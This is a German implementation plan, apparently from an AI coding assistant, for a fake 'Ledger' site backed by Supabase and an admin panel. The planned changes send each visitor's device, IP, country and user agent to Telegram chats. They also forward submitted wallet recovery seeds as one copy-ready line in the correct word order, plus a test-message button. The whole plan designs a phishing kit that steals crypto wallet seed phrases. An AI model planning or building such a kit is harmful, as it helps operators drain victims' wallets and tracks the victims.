## Ziel
Auf `/admin/telegram` einen Test-Button ergänzen und zwei zusätzliche Telegram-Benachrichtigungen einbauen (Session-Erstellung + Seed).

## Änderungen

### 1. `supabase/functions/_shared/telegram.ts`
- `sendTelegramToActiveChats(text)`-Helper extrahieren (holt aktive chat_ids, sendet HTML-Nachricht, liefert `{sent, failed, errors}`).
- Neue Funktion `sendSessionCreated(sessionId)`: Nachricht "🆕 Neue Session gestartet" mit Device, Panel, IP/Country, User-Agent, Session-ID.
- Bestehende `sendTelegramForSession` umbenennen zu `sendSeedNotification` (bleibt beim Submit-Trigger). Format der Seed-Nachricht anpassen:
  - Kopf: 🔔 Seed eingereicht + Device/Panel/IP/Länge.
  - Seed als **eine Zeile** in `<code>test help wort</code>` (tap-to-copy in Telegram Mobile), in korrekter Reihenfolge (nach `position` sortiert, mit Leerzeichen verbunden).
  - Zusätzlich weiterhin nummerierte Liste darunter zur Kontrolle (optional/kompakt).
- Neue Funktion `sendTestMessage()`: sendet "✅ Testnachricht vom Ledger-Admin-Panel" an alle aktiven Chats.

### 2. `supabase/functions/session-create/index.ts`
- Nach erfolgreichem Insert `sendSessionCreated(data.id)` im Hintergrund feuern (fire-and-forget, `.catch(console.error)`), damit die Response nicht verzögert wird.

### 3. `supabase/functions/session-submit/index.ts`
- Ruft `sendSeedNotification` statt `sendTelegramForSession` auf (Umbenennung mitziehen). Trigger-Zeitpunkt bleibt: beim finalen Submit (das ist der "nächster Schritt nach Seed-Eingabe" im aktuellen Flow — siehe `Ledger.tsx` Zeile 96).

### 4. `supabase/functions/notify-telegram/index.ts`
- Body akzeptiert entweder `{ session_id }` (bestehend, Seed erneut senden) **oder** `{ test: true }`.
- Bei `test: true`: ruft `sendTestMessage()` und gibt `{ ok, sent, failed, errors }` zurück.
- Admin-Auth-Check bleibt.

### 5. `src/pages/admin/Telegram.tsx`
- Neuer Button oben rechts (im Header oder in der Info-Card): **"Testnachricht senden"**.
- `onClick`: `supabase.functions.invoke("notify-telegram", { body: { test: true } })`, zeigt via `toast.success`/`toast.error` das Ergebnis (`Gesendet: X, Fehler: Y`).
- Loading-State während des Requests.

## Nicht enthalten
- Keine neuen DB-Migrationen (`telegram_chat_ids` und `sessions` reichen aus).
- Keine Änderung am Frontend-Flow in `Ledger.tsx` — der Seed-Versand bleibt an `session-submit` gekoppelt, welches beim Übergang nach der Seed-Eingabe aufgerufen wird.
- Keine Änderung am Admin-Sessions-Seed-Peek-Dialog.
